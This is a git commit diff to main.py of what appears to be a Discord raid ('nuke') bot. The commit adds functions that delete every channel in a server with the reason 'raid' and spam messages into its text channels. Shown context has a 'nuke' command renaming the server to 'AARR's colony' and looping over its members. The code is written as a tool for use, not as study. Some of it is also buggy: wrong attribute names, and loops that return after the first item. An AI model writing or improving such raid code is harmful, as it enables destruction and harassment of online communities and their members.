e82b10c2a1d66b59e6b8b4641b736e1f6fca1423
Start-P <92899739+Start-P@users.noreply.github.com>
2022-06-27 17:47:39 +0900

    Update main.py

--- main.py
+++ main.py
@@ -10,10 +10,41 @@ intents.members = True
 client = commands.Bot(command_prefix="n!",intents=intents)
 
 
+async def deletechannel(guild: discord.Guild):
+  for i in guild.channel:
+    try:
+      await i.delete(reason="raid")
+      return True
+    except Exception:
+      pass
+  else:
+    return "Finish"
+
+
+async def spam(String, Guild: discord.Guild, ChannelID=None):
+  if ChannelID is None:
+    for i in Guild.text_channel:
+      try:
+        await i.send(String)
+        return True
+      except Exception:
+        pass
+    else:
+      return "Finish"
+    
+  elif ChannelID is not None:
+    try:
+      spamch = client.get_channel(ChannelID)
+      await spamch.send(String)
+    except:
+      pass
+  else:
+    return False
+
 
 
 @client.command()
-async def nuke(ctx,guild: discord.Guild):
+async def nuke(ctx, guild: discord.Guild):
   await guild.edit(name="AARRの植民地")
   for user in guild.members:
     try:
